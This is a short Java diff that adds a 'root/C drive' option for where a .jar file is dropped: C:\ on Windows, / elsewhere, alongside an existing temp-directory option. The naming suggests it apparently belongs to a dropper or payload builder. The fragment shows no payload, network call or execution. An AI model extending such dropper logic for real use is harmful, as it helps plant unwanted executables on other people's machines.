@@ -85,7 +85,13 @@ public class Main {
 			}
 
 			File file = null;
-			if (dropLocation.equals("temp/documents (unix)")) {
+			if (dropLocation.equals("root/C drive")) {
+				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+					file = new File("C:\\" + dropFileName + ".jar");
+				} else {
+					file = new File("/" + dropFileName + ".jar");
+				}
+			} else if (dropLocation.equals("temp/documents (unix)")) {
 				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 					file = File.createTempFile(dropFileName, ".jar");
 				} else {
